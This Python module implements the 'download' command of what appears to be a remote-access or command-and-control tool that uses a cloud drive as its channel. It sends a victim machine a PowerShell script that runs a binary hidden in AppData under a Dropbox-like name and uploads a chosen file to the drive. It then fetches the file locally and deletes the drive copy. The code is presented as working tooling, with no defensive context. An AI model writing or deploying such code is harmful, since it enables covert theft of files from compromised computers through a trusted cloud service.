"""
Command download
"""


import os
import ntpath
from command.command import CommandBase
from logger.logger import Logger


class CommandDownload(CommandBase):
    def __init__(self):
        self._engine = None
        self._drive_client = None
        self._logger = None
        self._arguments = {}

    def get_name(self):
        return "download"

    def get_arguments_names(self):
        return {"path": "Remote target file path"}

    def set_arguments(self, arguments):
        self._arguments = arguments

    def run(self, engine, client, logger):
        self._engine = engine
        self._drive_client = client
        self._logger = logger
        prefix = engine.get_path_prefix()
        rpath = self._arguments.get(0)
        if not rpath:
            logger.log_message("Remote path not specified")
            return False
        name = ntpath.basename(rpath)
        script = f"$path=\"C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\MyDropbox\\DropboxAutoSync\\DropboxAutoSync.exe\";" \
                 f"& $path put \"{rpath}\" \"{prefix}/{name}\";"
        engine.run_script(script)
        return True

    def stop(self):
        pass
        "Nothing to do"

    def process_output(self, output):
        return output

    def drive_changed(self):
        path_prefix = self._engine.get_path_prefix()
        rpath = self._arguments.get(0)
        name = ntpath.basename(rpath)
        file_list = self._drive_client.list_dir(path_prefix)
        if name in file_list:
            rpath = rpath.replace(":", "")
            rpath = rpath.replace("/", os.sep)
            lpath = "." + path_prefix + os.sep + rpath
            ldir_path = os.sep.join(lpath.split(os.sep)[0:-1])
            if not os.path.exists(ldir_path):
                os.makedirs(ldir_path, exist_ok=True)

            rpath = path_prefix + "/" + name
            self._drive_client.download_file(rpath, lpath)
            self._drive_client.remove(rpath)
            self._logger.log_message(f"File saved to '{lpath}'")
